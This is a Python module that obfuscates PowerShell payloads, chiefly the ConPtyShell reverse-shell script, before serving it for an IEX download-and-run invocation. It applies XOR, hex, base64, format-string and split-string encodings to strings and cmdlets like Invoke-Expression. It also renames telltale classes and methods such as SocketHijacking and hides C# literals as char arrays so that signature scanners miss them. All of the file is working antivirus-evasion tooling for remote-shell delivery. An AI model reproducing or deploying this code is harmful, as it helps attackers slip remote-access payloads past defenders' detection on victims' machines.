from __future__ import annotations

import base64
import random
import re
import string

def _to_ps_hex_str(s: str) -> str:
    hex_bytes = ",".join(f"0x{b:02X}" for b in s.encode())
    return f"([System.Text.Encoding]::UTF8.GetString([byte[]]({hex_bytes})))"


def _ps_hex_obfuscate(payload: str) -> str:
    return re.sub(r"'([^']*)'", lambda m: _to_ps_hex_str(m.group(1)), payload)


def _split_parts(s: str) -> list[str]:
    n = random.randint(2, min(4, len(s)))
    indices = sorted(random.sample(range(1, len(s)), n - 1))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    return parts


def _random_split(cmdlet: str) -> str:
    """String-concatenation call: &('New-'+'Object') or &('A'+'dd'+'-Type'). Used by syntax obfuscator."""
    parts = _split_parts(cmdlet)
    q = random.choice(('"', "'"))
    return "&(" + "+".join(f"{q}{p}{q}" for p in parts) + ")"


def _obfuscate_call(cmdlet: str) -> str:
    """Pick randomly from concat, format-string, and char-array call forms."""
    technique = random.randrange(3)
    if technique == 0:
        return _random_split(cmdlet)
    elif technique == 1:
        parts = _split_parts(cmdlet)
        placeholders = "".join(f"{{{i}}}" for i in range(len(parts)))
        args = ",".join(f"'{p}'" for p in parts)
        return f"&(('{placeholders}'-f{args}))"
    else:
        codes = ",".join(str(ord(c)) for c in cmdlet)
        return f"&(-join[char[]]@({codes}))"


_PS_CMDLETS = [
    "Invoke-Expression",
    "New-Object",
    "Out-String",
    "Get-Content",
    "Write-Host",
    "Get-Item",
    "Test-Path",
    "iex",
    "pwd",
]


def _ps_syntax_obfuscate(payload: str) -> str:
    result = payload
    for cmdlet in _PS_CMDLETS:
        result = re.sub(
            rf'(?<![.\w]){re.escape(cmdlet)}(?![\w])',
            lambda _, c=cmdlet: _random_split(c),
            result,
        )
    return result


def _format_split(s: str) -> str:
    if len(s) < 2:
        return f"'{s}'"
    n = random.randint(2, min(3, len(s)))
    indices = sorted(random.sample(range(1, len(s)), n - 1))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    placeholders = "".join(f"{{{i}}}" for i in range(n))
    parts_str = ",".join(f"'{p}'" for p in parts)
    return f"('{placeholders}' -f {parts_str})"


def _ps_format_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _format_split(m.group(1)),
        payload,
    )


def _xor_encode_str(s: str) -> str:
    key = random.randint(1, 255)
    var = f"k{random.randint(1000, 9999)}"
    hex_bytes = ",".join(f"0x{(ord(c) ^ key):02x}" for c in s)
    return f"$(${var}={key};$b=[byte[]]({hex_bytes});-join($b|%{{[char]($_-bxor${var})}}))"


def _ps_xor_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _xor_encode_str(m.group(1)),
        payload,
    )


def _rand_ident(length: int = 10) -> str:
    first = random.choice(string.ascii_letters)
    rest = random.choices(string.ascii_letters + string.digits, k=length - 1)
    return first + "".join(rest)


def _cs_char_array(value: str) -> str:
    """Construct a C# runtime expression equivalent to a string literal.
    Produces no string literal in MSIL, only a char-array allocation.
    """
    chars = ",".join(f"(char){ord(c)}" for c in value)
    return f"new string(new char[]{{{chars}}})"


_CS_SIGNAL_LITERALS: list[tuple[str, str]] = [
    ('"\\\\Device\\\\Afd"',   "\\Device\\Afd"),
    ('"CreatePseudoConsole"',  "CreatePseudoConsole"),
    ('"File"',                 "File"),
]

def _ps_base64_encode(payload: str) -> str:
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
    return f"powershell -enc {b64}"


def obfuscate_conptyshell(ps1_data: bytes) -> tuple[bytes, str]:
    """Obfuscate a ConPtyShell PS1 script in-memory before serving it.

    Returns ``(obfuscated_bytes, new_function_name)`` so the caller can build
    the IEX invocation using the renamed PS function.
    """
    payload = ps1_data.decode("utf-8", errors="replace")

    renames: list[tuple[str, str]] = [
        # PS function name
        ("Invoke-ConPtyShell",              "Invoke-" + _rand_ident(9)),
        # ConPty-prefixed class names
        ("ConPtyShellMainClass",            _rand_ident(12)),
        ("ConPtyShellException",            _rand_ident(10)),
        ("SpawnConPtyShell",                _rand_ident(11)),
        ("ConPtyShell",                     _rand_ident(11)),
        # Other class names (all end up in MSIL type metadata)
        ("SocketHijacking",                 _rand_ident(12)),
        ("DeadlockCheckHelper",             _rand_ident(12)),
        ("ParentProcessUtilities",          _rand_ident(14)),
        # Distinctive method names
        ("NtQuerySystemInformationDynamic", _rand_ident(14)),
        ("NtQueryObjectDynamic",            _rand_ident(12)),
        ("QueryObjectTypesInfo",            _rand_ident(12)),
        ("GetTypeIndexByName",              _rand_ident(12)),
        ("DuplicateSocketsFromHandles",     _rand_ident(13)),
        ("FilterAndOrderSocketsByBytesIn",  _rand_ident(14)),
        ("GetSocketTcpInfo",                _rand_ident(11)),
        ("DuplicateSocketFromHandle",       _rand_ident(13)),
        ("GetSocketsTargetProcess",         _rand_ident(13)),
        ("IsSocketInherited",               _rand_ident(12)),
        ("IsSocketOverlapped",              _rand_ident(12)),
        ("DuplicateTargetProcessSocket",    _rand_ident(14)),
        ("SetSocketBlockingMode",           _rand_ident(12)),
        ("CheckDeadlockDetected",           _rand_ident(12)),
        ("ThreadCheckDeadlock",             _rand_ident(12)),
        ("GetParentProcess",                _rand_ident(11)),
        ("AlignUp",                         _rand_ident(8)),
        # PS variable holding the C# source
        ("$Source",                         "$" + _rand_ident(8)),
    ]
    new_fn  = renames[0][1]
    new_src = renames[-1][1]

    for old, new in renames:
        payload = payload.replace(old, new)

    here_start = payload.find(f"{new_src} = @\"")
    if here_start == -1:
        here_start = payload.find('@"')
    cs_start = payload.find('\n', here_start) + 1 if here_start != -1 else len(payload)
    cs_end   = payload.rfind('"@')

    if cs_start < cs_end:
        cs_body = payload[cs_start:cs_end]
        for src_literal, value in _CS_SIGNAL_LITERALS:
            cs_body = cs_body.replace(src_literal, _cs_char_array(value))
        payload = payload[:cs_start] + cs_body + payload[cs_end:]

    ps_end  = payload.find(f"{new_src} = @\"")
    if ps_end == -1:
        ps_end = len(payload)
    ps_part = payload[:ps_end]
    ps_part = re.sub(r'\bAdd-Type\b', lambda _: _random_split("Add-Type"), ps_part)
    payload = ps_part + payload[ps_end:]

    return payload.encode("utf-8"), new_fn
